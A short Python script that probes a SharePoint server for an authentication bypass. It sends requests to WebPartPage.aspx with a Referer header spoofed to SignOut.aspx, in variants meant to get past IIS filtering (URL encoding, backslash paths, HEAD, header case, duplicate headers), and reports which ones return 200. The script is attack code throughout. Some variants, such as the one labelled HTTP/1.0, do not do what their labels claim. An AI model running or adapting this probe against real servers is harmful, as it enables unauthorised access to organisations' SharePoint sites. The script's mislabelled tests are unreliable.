import requests

base_url = "http://10.10.10.166"

# Test IIS/ASP.NET specific behaviors
quirk_tests = [
    # IIS request filtering bypass techniques
    ("Double URL encoding", "/_layouts/15/WebPartPage.aspx", {"Referer": "/%5f%6c%61%79%6f%75%74%73/SignOut.aspx"}),
    
    # ASP.NET path normalization
    ("Backslash in path", "/_layouts\\15\\WebPartPage.aspx", {"Referer": "/_layouts/SignOut.aspx"}),
    
    # HTTP verb tampering (already tested GET/POST, try others)
    ("HEAD method", "/_layouts/15/WebPartPage.aspx", {"Referer": "/_layouts/SignOut.aspx"}),
    
    # HTTP/1.0 vs HTTP/1.1
    ("HTTP/1.0 request", "/_layouts/15/WebPartPage.aspx", {"Referer": "/_layouts/SignOut.aspx"}),
    
    # Case sensitivity in HTTP headers
    ("Lowercase referer", "/_layouts/15/WebPartPage.aspx", {"referer": "/_layouts/SignOut.aspx"}),
    
    # Multiple referer headers
    ("Double Referer", "/_layouts/15/WebPartPage.aspx", {"Referer": ["/_layouts/login.aspx", "/_layouts/SignOut.aspx"]}),
]

for name, path, headers in quirk_tests:
    headers["User-Agent"] = "Mozilla/5.0"
    try:
        if name == "HEAD method":
            resp = requests.head(base_url + path, headers=headers, timeout=10)
        else:
            resp = requests.get(base_url + path, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            print(f"✓ [{name}] Status: {resp.status_code} - WORKS")
        elif resp.status_code == 401:
            print(f"✗ [{name}] Status: {resp.status_code}")
        else:
            print(f"? [{name}] Status: {resp.status_code}")
    except Exception as e:
        print(f"✗ [{name}] Error: {str(e)[:50]}")
